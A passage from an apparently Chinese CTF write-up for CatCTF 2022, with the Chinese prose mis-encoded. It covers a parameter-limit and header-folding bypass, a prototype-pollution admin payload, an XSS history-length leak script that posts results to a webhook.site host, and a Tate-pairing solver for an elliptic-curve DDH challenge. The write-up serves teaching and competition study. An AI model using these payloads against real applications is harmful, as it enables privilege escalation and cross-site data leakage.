class="line">&quot;801&quot;:&quot;1&quot;,</span><br><span class="line">&quot;802&quot;:&quot;1&quot;,</span><br><span class="line">&quot;803&quot;:&quot;1&quot;,</span><br><span class="line">&quot;804&quot;:&quot;1&quot;,</span><br><span class="line">&quot;805&quot;:&quot;1&quot;,</span><br><span class="line">&quot;806&quot;:&quot;1&quot;,</span><br><span class="line">&quot;807&quot;:&quot;1&quot;,</span><br><span class="line">&quot;808&quot;:&quot;1&quot;,</span><br><span class="line">&quot;809&quot;:&quot;1&quot;,</span><br><span class="line">&quot;810&quot;:&quot;1&quot;,</span><br><span class="line">&quot;811&quot;:&quot;1&quot;,</span><br><span class="line">&quot;812&quot;:&quot;1&quot;,</span><br><span class="line">&quot;813&quot;:&quot;1&quot;,</span><br><span class="line">&quot;814&quot;:&quot;1&quot;,</span><br><span class="line">&quot;815&quot;:&quot;1&quot;,</span><br><span class="line">&quot;816&quot;:&quot;1&quot;,</span><br><span class="line">&quot;817&quot;:&quot;1&quot;,</span><br><span class="line">&quot;818&quot;:&quot;1&quot;,</span><br><span class="line">&quot;819&quot;:&quot;1&quot;,</span><br><span class="line">&quot;820&quot;:&quot;1&quot;,</span><br><span class="line">&quot;821&quot;:&quot;1&quot;,</span><br><span class="line">&quot;822&quot;:&quot;1&quot;,</span><br><span class="line">&quot;823&quot;:&quot;1&quot;,</span><br><span class="line">&quot;824&quot;:&quot;1&quot;,</span><br><span class="line">&quot;825&quot;:&quot;1&quot;,</span><br><span class="line">&quot;826&quot;:&quot;1&quot;,</span><br><span class="line">&quot;827&quot;:&quot;1&quot;,</span><br><span class="line">&quot;828&quot;:&quot;1&quot;,</span><br><span class="line">&quot;829&quot;:&quot;1&quot;,</span><br><span class="line">&quot;830&quot;:&quot;1&quot;,</span><br><span class="line">&quot;831&quot;:&quot;1&quot;,</span><br><span class="line">&quot;832&quot;:&quot;1&quot;,</span><br><span class="line">&quot;833&quot;:&quot;1&quot;,</span><br><span class="line">&quot;834&quot;:&quot;1&quot;,</span><br><span class="line">&quot;835&quot;:&quot;1&quot;,</span><br><span class="line">&quot;836&quot;:&quot;1&quot;,</span><br><span class="line">&quot;837&quot;:&quot;1&quot;,</span><br><span class="line">&quot;838&quot;:&quot;1&quot;,</span><br><span class="line">&quot;839&quot;:&quot;1&quot;,</span><br><span class="line">&quot;840&quot;:&quot;1&quot;,</span><br><span class="line">&quot;841&quot;:&quot;1&quot;,</span><br><span class="line">&quot;842&quot;:&quot;1&quot;,</span><br><span class="line">&quot;843&quot;:&quot;1&quot;,</span><br><span class="line">&quot;844&quot;:&quot;1&quot;,</span><br><span class="line">&quot;845&quot;:&quot;1&quot;,</span><br><span class="line">&quot;846&quot;:&quot;1&quot;,</span><br><span class="line">&quot;847&quot;:&quot;1&quot;,</span><br><span class="line">&quot;848&quot;:&quot;1&quot;,</span><br><span class="line">&quot;849&quot;:&quot;1&quot;,</span><br><span class="line">&quot;850&quot;:&quot;1&quot;,</span><br><span class="line">&quot;851&quot;:&quot;1&quot;,</span><br><span class="line">&quot;852&quot;:&quot;1&quot;,</span><br><span class="line">&quot;853&quot;:&quot;1&quot;,</span><br><span class="line">&quot;854&quot;:&quot;1&quot;,</span><br><span class="line">&quot;855&quot;:&quot;1&quot;,</span><br><span class="line">&quot;856&quot;:&quot;1&quot;,</span><br><span class="line">&quot;857&quot;:&quot;1&quot;,</span><br><span class="line">&quot;858&quot;:&quot;1&quot;,</span><br><span class="line">&quot;859&quot;:&quot;1&quot;,</span><br><span class="line">&quot;860&quot;:&quot;1&quot;,</span><br><span class="line">&quot;861&quot;:&quot;1&quot;,</span><br><span class="line">&quot;862&quot;:&quot;1&quot;,</span><br><span class="line">&quot;863&quot;:&quot;1&quot;,</span><br><span class="line">&quot;864&quot;:&quot;1&quot;,</span><br><span class="line">&quot;865&quot;:&quot;1&quot;,</span><br><span class="line">&quot;866&quot;:&quot;1&quot;,</span><br><span class="line">&quot;867&quot;:&quot;1&quot;,</span><br><span class="line">&quot;868&quot;:&quot;1&quot;,</span><br><span class="line">&quot;869&quot;:&quot;1&quot;,</span><br><span class="line">&quot;870&quot;:&quot;1&quot;,</span><br><span class="line">&quot;871&quot;:&quot;1&quot;,</span><br><span class="line">&quot;872&quot;:&quot;1&quot;,</span><br><span class="line">&quot;873&quot;:&quot;1&quot;,</span><br><span class="line">&quot;874&quot;:&quot;1&quot;,</span><br><span class="line">&quot;875&quot;:&quot;1&quot;,</span><br><span class="line">&quot;876&quot;:&quot;1&quot;,</span><br><span class="line">&quot;877&quot;:&quot;1&quot;,</span><br><span class="line">&quot;878&quot;:&quot;1&quot;,</span><br><span class="line">&quot;879&quot;:&quot;1&quot;,</span><br><span class="line">&quot;880&quot;:&quot;1&quot;,</span><br><span class="line">&quot;881&quot;:&quot;1&quot;,</span><br><span class="line">&quot;882&quot;:&quot;1&quot;,</span><br><span class="line">&quot;883&quot;:&quot;1&quot;,</span><br><span class="line">&quot;884&quot;:&quot;1&quot;,</span><br><span class="line">&quot;885&quot;:&quot;1&quot;,</span><br><span class="line">&quot;886&quot;:&quot;1&quot;,</span><br><span class="line">&quot;887&quot;:&quot;1&quot;,</span><br><span class="line">&quot;888&quot;:&quot;1&quot;,</span><br><span class="line">&quot;889&quot;:&quot;1&quot;,</span><br><span class="line">&quot;890&quot;:&quot;1&quot;,</span><br><span class="line">&quot;891&quot;:&quot;1&quot;,</span><br><span class="line">&quot;892&quot;:&quot;1&quot;,</span><br><span class="line">&quot;893&quot;:&quot;1&quot;,</span><br><span class="line">&quot;894&quot;:&quot;1&quot;,</span><br><span class="line">&quot;895&quot;:&quot;1&quot;,</span><br><span class="line">&quot;896&quot;:&quot;1&quot;,</span><br><span class="line">&quot;897&quot;:&quot;1&quot;,</span><br><span class="line">&quot;898&quot;:&quot;1&quot;,</span><br><span class="line">&quot;899&quot;:&quot;1&quot;,</span><br><span class="line">&quot;900&quot;:&quot;1&quot;,</span><br><span class="line">&quot;901&quot;:&quot;1&quot;,</span><br><span class="line">&quot;902&quot;:&quot;1&quot;,</span><br><span class="line">&quot;903&quot;:&quot;1&quot;,</span><br><span class="line">&quot;904&quot;:&quot;1&quot;,</span><br><span class="line">&quot;905&quot;:&quot;1&quot;,</span><br><span class="line">&quot;906&quot;:&quot;1&quot;,</span><br><span class="line">&quot;907&quot;:&quot;1&quot;,</span><br><span class="line">&quot;908&quot;:&quot;1&quot;,</span><br><span class="line">&quot;909&quot;:&quot;1&quot;,</span><br><span class="line">&quot;910&quot;:&quot;1&quot;,</span><br><span class="line">&quot;911&quot;:&quot;1&quot;,</span><br><span class="line">&quot;912&quot;:&quot;1&quot;,</span><br><span class="line">&quot;913&quot;:&quot;1&quot;,</span><br><span class="line">&quot;914&quot;:&quot;1&quot;,</span><br><span class="line">&quot;915&quot;:&quot;1&quot;,</span><br><span class="line">&quot;916&quot;:&quot;1&quot;,</span><br><span class="line">&quot;917&quot;:&quot;1&quot;,</span><br><span class="line">&quot;918&quot;:&quot;1&quot;,</span><br><span class="line">&quot;919&quot;:&quot;1&quot;,</span><br><span class="line">&quot;920&quot;:&quot;1&quot;,</span><br><span class="line">&quot;921&quot;:&quot;1&quot;,</span><br><span class="line">&quot;922&quot;:&quot;1&quot;,</span><br><span class="line">&quot;923&quot;:&quot;1&quot;,</span><br><span class="line">&quot;924&quot;:&quot;1&quot;,</span><br><span class="line">&quot;925&quot;:&quot;1&quot;,</span><br><span class="line">&quot;926&quot;:&quot;1&quot;,</span><br><span class="line">&quot;927&quot;:&quot;1&quot;,</span><br><span class="line">&quot;928&quot;:&quot;1&quot;,</span><br><span class="line">&quot;929&quot;:&quot;1&quot;,</span><br><span class="line">&quot;930&quot;:&quot;1&quot;,</span><br><span class="line">&quot;931&quot;:&quot;1&quot;,</span><br><span class="line">&quot;932&quot;:&quot;1&quot;,</span><br><span class="line">&quot;933&quot;:&quot;1&quot;,</span><br><span class="line">&quot;934&quot;:&quot;1&quot;,</span><br><span class="line">&quot;935&quot;:&quot;1&quot;,</span><br><span class="line">&quot;936&quot;:&quot;1&quot;,</span><br><span class="line">&quot;937&quot;:&quot;1&quot;,</span><br><span class="line">&quot;938&quot;:&quot;1&quot;,</span><br><span class="line">&quot;939&quot;:&quot;1&quot;,</span><br><span class="line">&quot;940&quot;:&quot;1&quot;,</span><br><span class="line">&quot;941&quot;:&quot;1&quot;,</span><br><span class="line">&quot;942&quot;:&quot;1&quot;,</span><br><span class="line">&quot;943&quot;:&quot;1&quot;,</span><br><span class="line">&quot;944&quot;:&quot;1&quot;,</span><br><span class="line">&quot;945&quot;:&quot;1&quot;,</span><br><span class="line">&quot;946&quot;:&quot;1&quot;,</span><br><span class="line">&quot;947&quot;:&quot;1&quot;,</span><br><span class="line">&quot;948&quot;:&quot;1&quot;,</span><br><span class="line">&quot;949&quot;:&quot;1&quot;,</span><br><span class="line">&quot;950&quot;:&quot;1&quot;,</span><br><span class="line">&quot;951&quot;:&quot;1&quot;,</span><br><span class="line">&quot;952&quot;:&quot;1&quot;,</span><br><span class="line">&quot;953&quot;:&quot;1&quot;,</span><br><span class="line">&quot;954&quot;:&quot;1&quot;,</span><br><span class="line">&quot;955&quot;:&quot;1&quot;,</span><br><span class="line">&quot;956&quot;:&quot;1&quot;,</span><br><span class="line">&quot;957&quot;:&quot;1&quot;,</span><br><span class="line">&quot;958&quot;:&quot;1&quot;,</span><br><span class="line">&quot;959&quot;:&quot;1&quot;,</span><br><span class="line">&quot;960&quot;:&quot;1&quot;,</span><br><span class="line">&quot;961&quot;:&quot;1&quot;,</span><br><span class="line">&quot;962&quot;:&quot;1&quot;,</span><br><span class="line">&quot;963&quot;:&quot;1&quot;,</span><br><span class="line">&quot;964&quot;:&quot;1&quot;,</span><br><span class="line">&quot;965&quot;:&quot;1&quot;,</span><br><span class="line">&quot;966&quot;:&quot;1&quot;,</span><br><span class="line">&quot;967&quot;:&quot;1&quot;,</span><br><span class="line">&quot;968&quot;:&quot;1&quot;,</span><br><span class="line">&quot;969&quot;:&quot;1&quot;,</span><br><span class="line">&quot;970&quot;:&quot;1&quot;,</span><br><span class="line">&quot;971&quot;:&quot;1&quot;,</span><br><span class="line">&quot;972&quot;:&quot;1&quot;,</span><br><span class="line">&quot;973&quot;:&quot;1&quot;,</span><br><span class="line">&quot;974&quot;:&quot;1&quot;,</span><br><span class="line">&quot;975&quot;:&quot;1&quot;,</span><br><span class="line">&quot;976&quot;:&quot;1&quot;,</span><br><span class="line">&quot;977&quot;:&quot;1&quot;,</span><br><span class="line">&quot;978&quot;:&quot;1&quot;,</span><br><span class="line">&quot;979&quot;:&quot;1&quot;,</span><br><span class="line">&quot;980&quot;:&quot;1&quot;,</span><br><span class="line">&quot;981&quot;:&quot;1&quot;,</span><br><span class="line">&quot;982&quot;:&quot;1&quot;,</span><br><span class="line">&quot;983&quot;:&quot;1&quot;,</span><br><span class="line">&quot;984&quot;:&quot;1&quot;,</span><br><span class="line">&quot;985&quot;:&quot;1&quot;,</span><br><span class="line">&quot;986&quot;:&quot;1&quot;,</span><br><span class="line">&quot;987&quot;:&quot;1&quot;,</span><br><span class="line">&quot;988&quot;:&quot;1&quot;,</span><br><span class="line">&quot;989&quot;:&quot;1&quot;,</span><br><span class="line">&quot;990&quot;:&quot;1&quot;,</span><br><span class="line">&quot;991&quot;:&quot;1&quot;,</span><br><span class="line">&quot;992&quot;:&quot;1&quot;,</span><br><span class="line">&quot;993&quot;:&quot;1&quot;,</span><br><span class="line">&quot;994&quot;:&quot;1&quot;,</span><br><span class="line">&quot;995&quot;:&quot;1&quot;,</span><br><span class="line">&quot;996&quot;:&quot;1&quot;,</span><br><span class="line">&quot;997&quot;:&quot;1&quot;,</span><br><span class="line">&quot;998&quot;:&quot;1&quot;,</span><br><span class="line">&quot;999&quot;:&quot;1&quot;,</span><br><span class="line">&quot;1000&quot;:&quot;1&quot;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/ez_curl_Flag_P5SbhJxx3h.png" class="">

<p>ä¸¤ä¸ªtrick</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ljharb/qs/blob/7e937fafdf67330d54547bbd34909f1f0c11ed72/lib/parse.js" title="https://github.com/ljharb/qs/blob/7e937fafdf67330d54547bbd34909f1f0c11ed72/lib/parse.js">https://github.com/ljharb/qs/blob/7e937fafdf67330d54547bbd34909f1f0c11ed72/lib/parse.js</a></p>
<p>expressçš„parameterLimité»˜è®¤ä¸º1000ï¼Œä¼ 1000ä¸ªå‚æ•°PHPä¸­çš„admin&#x3D;falseä¼šè¢«å¿½ç•¥ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2" title="https://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2">https://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.2</a></p>
<p>æ ¹æ®rfcï¼Œheaderå­—æ®µå¯ä»¥é€šè¿‡åœ¨æ¯ä¸€è¡Œå‰é¢è‡³å°‘åŠ ä¸€ä¸ªSPæˆ–HTæ¥æ‰©å±•åˆ°å¤šè¡Œã€‚ä»¥æ­¤ç»•è¿‡å¯¹headersçš„è¿‡æ»¤ã€‚</p>
<h3 id="wifeğŸ’ƒ"><a href="#wifeğŸ’ƒ" class="headerlink" title="wifeğŸ’ƒ"></a>wifeğŸ’ƒ</h3><p>ç®€å•çš„åŸå‹é“¾æ±¡æŸ“ï¼Œç„¶åè¹­äº†ä¸€ä¸‹åŸç¥çš„çƒ­åº¦ã€‚é¢˜ç›®é€»è¾‘å¾ˆç®€å•ï¼Œè¦é‚€è¯·ç æ‰èƒ½æ³¨å†Œä¸ºadminï¼Œæ™®é€šç”¨æˆ·åªèƒ½æ‹¿åˆ°wifeï¼Œæ²¡æœ‰flagã€‚</p>
<p>å½“æ—¶é¢˜ç›®æ˜¯é»‘ç›’çš„æ¡ä»¶ï¼Œå¸ˆå‚…ä»¬å¯ä»¥é€šè¿‡ fuzz å¾—åˆ°æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå› ä¸ºåœ¨åé¢é¢˜ç›®è¿˜æ˜¯ 0 è§£çš„æƒ…å†µä¸‹æˆ‘ä»¬æ”¾å‡ºäº† hintï¼šåç«¯æŸå¤„é‡‡ç”¨äº† Object.assign()</p>
<p>è¿™é‡Œæˆ‘ä»¬æ”¾å‡ºæºç ï¼šçœ‹ä¸€ä¸‹æ³¨å†Œçš„é€»è¾‘</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span> (!user.<span class="property">username</span> || !user.<span class="property">password</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;empty username or password&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">filter</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> == user.<span class="property">username</span>).<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;username already exists&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (user.<span class="property">isAdmin</span> &amp;&amp; user.<span class="property">inviteCode</span> != <span class="variable constant_">INVITE_CODE</span>) &#123;</span><br><span class="line">        user.<span class="property">isAdmin</span> = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;invalid invite code&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> newUser = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, baseUser, user)</span><br><span class="line">    users.<span class="title function_">push</span>(newUser)</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;user created successfully&#x27;</span>, <span class="attr">err</span>: <span class="literal">false</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>ç¨å¾®æœä¸€ä¸‹ Object.assign å¯ä»¥å‘ç°è¿™ä¸ªæ–¹æ³•æ˜¯å¯ä»¥è§¦å‘åŸå‹é“¾æ±¡æŸ“çš„ï¼Œç„¶åæ±¡æŸ“ <code>__proto__.isAdmin</code> ä¸º true å°±å¯ä»¥äº†ã€‚</p>
<p>è´´ä¸€ä¸ªpayload</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡adminè™½ç„¶å¯ä»¥æ‹¿åˆ°flagï¼Œä½†æ˜¯æ²¡æœ‰wifeã€‚ï¼šï¼‰</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/cat_wife_Flag_2NNIQrqGO2.png" class="">

<h3 id="web-challengeğŸ’ª"><a href="#web-challengeğŸ’ª" class="headerlink" title="web_challengeğŸ’ª"></a>web_challengeğŸ’ª</h3><p>å…ˆæ³¨å†Œå¹¶ç™»å½•ï¼Œæ˜¯ä¸€é“ XSS æ‰“ Leak</p>
<p>æ¼æ´ç‚¹</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/sharePoiint_Y65bxu5YbT.png" class="">

<p>exp.html å¦‚ä¸‹</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    let text = new URLSearchParams(location.search).get(&#x27;text&#x27;)</span><br><span class="line">    let w = window.open(&#x27;http://localhost:5000/find?text=&#x27; + text)</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">        w.location = &#x27;about:blank&#x27;</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">            console.log(w.history.length)</span><br><span class="line">            const webhook = &#x27;https://webhook.site/c171b240-3c3f-4121-91f3-a4f3a6987e35&#x27;</span><br><span class="line">            fetch(webhook, &#123;method:&#x27;POST&#x27;, body:w.history.length&#125;)</span><br><span class="line">        &#125;, 1000)</span><br><span class="line">    &#125;, 2000)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>webhookï¼š<a target="_blank" rel="noopener" href="https://webhook.site/" title="https://webhook.site/">https://webhook.site/</a></p>
<p>æ­£ç¡®å›æ˜¾æ˜¯ 2ï¼Œé”™è¯¯å›æ˜¾æ˜¯ 3ï¼Œå‘é€è¯·æ±‚ ï¼Œè¿™æ˜¯é”™è¯¯çš„ï¼Œå›æ˜¾ä¸º 3</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP:port/exp.html?text=catctf&#123;t1</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/pastebin3_YAAh6ES4hR.png" class="">

<p>æ­£ç¡®çš„å›æ˜¾ä¸º 2</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP:port/exp.html?text=catctf&#123;tes</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/pastebin2_GOpi0mTtAn.png" class="">

<p>æœ¬é¢˜çš„è„šæœ¬è‹¥æ˜¯ç”¨ python å†™æ˜¯æ— æ³•å®ç°çš„ï¼Œéœ€è¦ç”¨ js æˆ– ts æ¥ç¼–å†™ï¼Œæœ‰å…´è¶£å¯ä»¥è”ç³» LemonPerfect å¸ˆå‚…(QQ:1476136743)</p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="DDH-Game"><a href="#DDH-Game" class="headerlink" title="DDH_Game"></a>DDH_Game</h3><p>å›¾ç‰‡æ¥è‡ª <a target="_blank" rel="noopener" href="https://toc.cryptobook.us/" title="A Graduate Course in Applied Cryptography(Version 0.5)">A Graduate Course in Applied Cryptography(Version 0.5)</a></p>
<img src="/2023/01/01/Nepnep-CatCTF2022/DDH_gOaCb9oWJA.png" class="">

<p>è¿™é“é¢˜æ˜¾ç„¶æ˜¯è®©æˆ‘ä»¬æ±‚è§£æ¤­åœ†æ›²çº¿ä¸Šçš„DDHé—®é¢˜(ECDDHP)ã€‚</p>
<h4 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h4><p>ç”±äºé¢˜ç›®ä¸­çš„BLSæ›²çº¿æ˜¯é…å¯¹å‹å¥½æ›²çº¿ï¼Œæ‰€ä»¥å¯ä»¥è®¡ç®—åŒçº¿æ€§å¯¹ã€‚</p>
<p>åŒçº¿æ€§å¯¹æ»¡è¶³ $e(aG, bG) &#x3D; e(G, abG)$</p>
<p>è¿™å°±ç»™äº†æˆ‘ä»¬ä¸€ä¸ªè§£DDHPçš„åé—¨ã€‚å› æ­¤å¦‚æœéšä¾¿é€‰ä¸€ä¸ªæ¤­åœ†æ›²çº¿ç‚¹ç¾¤ï¼ŒECDDHå‡è®¾é€šå¸¸æ˜¯ä¸æˆç«‹çš„ï¼Œå¹¶ä¸”æ”»å‡»æ–¹æ³•å°±å¾ˆç®€å•ï¼šçœ‹ç­‰å¼$e(aG, bG) &#x3D; e(G, cG)$ æ˜¯å¦æˆç«‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sagemath 9.5</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Before running, modify your filename and add &quot;DDH_instances = &quot; at the beginning of the file.</span></span><br><span class="line">load(<span class="string">&#x27;DDH_instances.sage&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># curve</span></span><br><span class="line">p = <span class="number">0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab</span></span><br><span class="line">K = GF(p)</span><br><span class="line">a = K(<span class="number">0x00</span>)</span><br><span class="line">b = K(<span class="number">0x04</span>)</span><br><span class="line">E = EllipticCurve(K, (a, b))</span><br><span class="line"><span class="comment"># G = E(0x17F1D3A73197D7942695638C4FA9AC0FC3688C4F9774B905A14E3A3F171BAC586C55E83FF97A1AEFFB3AF00ADB22C6BB, 0x08B3F481E3AAA0F1A09E30ED741D8AE4FCF5E095D5D00AF600DB18CB2C04B3EDD03CC744A2888AE40CAA232946C5E7E1)</span></span><br><span class="line">E.set_order(<span class="number">0x73EDA753299D7D483339D80809A1D80553BDA402FFFE5BFEFFFFFFFF00000001</span> * <span class="number">0x396C8C005555E1568C00AAAB0000AAAB</span>)</span><br><span class="line"></span><br><span class="line">G = E(<span class="number">3745324820672390389968901155878445437664963280229755729082200523555105705468830220374025474630687037635107257976475</span>, <span class="number">2578846078515277795052385204310204126349387494123866919108681393764788346607753607675088305233984015170544920715533</span>)</span><br><span class="line">n = G.order()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Embedding degree of the curve</span></span><br><span class="line">k = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_ECDDHP</span>(<span class="params">DDH_instances, G, Ep, m, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        DDH_instances - list consists of (aG, bG, cG), where aG, bG, cG are EC_point.xy()</span></span><br><span class="line"><span class="string">        m - embedding degree of &lt;G&gt;</span></span><br><span class="line"><span class="string">        n - G&#x27;s order. </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    sols = []</span><br><span class="line">    </span><br><span class="line">    Fpm.&lt;x&gt; = GF(p^m)</span><br><span class="line">    Epm = Ep.base_extend(Fpm) </span><br><span class="line">    </span><br><span class="line">    G = Epm(G)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> DDH_instances:</span><br><span class="line">        aG, bG, cG = ins</span><br><span class="line">        aG = Epm(aG); bG = Epm(bG); cG = Epm(cG)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># e_aG_bG = aG.weil_pairing(bG, n)</span></span><br><span class="line">        e_aG_bG = aG.tate_pairing(bG, n, m)</span><br><span class="line">        </span><br><span class="line">        e_G_cG = G.tate_pairing(cG, n, m)</span><br><span class="line">        <span class="keyword">if</span> e_aG_bG == e_G_cG:</span><br><span class="line">            sols.append(<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sols.append(<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sols</span><br><span class="line"></span><br><span class="line">sols = solve_ECDDHP(DDH_instances, G, E, k, n)</span><br><span class="line"><span class="comment"># print(sols)</span></span><br><span class="line"></span><br><span class="line">pt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sols)):</span><br><span class="line">    pt += sols[i] * (<span class="number">2</span>^i)</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(pt)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;CatCTF&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h4><p>å…¶å®æ˜¯éé¢„æœŸè§£ï¼Œä¸è¿‡æµ‹é¢˜çš„æ—¶å€™é˜Ÿé‡Œæœ‰å…¶ä»–å¸ˆå‚…æƒ³åˆ°äº†ï¼Œæ„Ÿè§‰è¿™ä¸ªæ€è·¯ä¹Ÿæ˜¯ç›´å‡»DDHé—®é¢˜ä¸­çš„â€™Decisionalâ€™ ã€‚</p>
<p>é¢˜ç›®ä¸­ç‚¹Gçš„é˜¶ä¸º</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E7%82%B9G%E7%9A%84%E9%98%B6_8Ppl0UdFm9.png" class="">

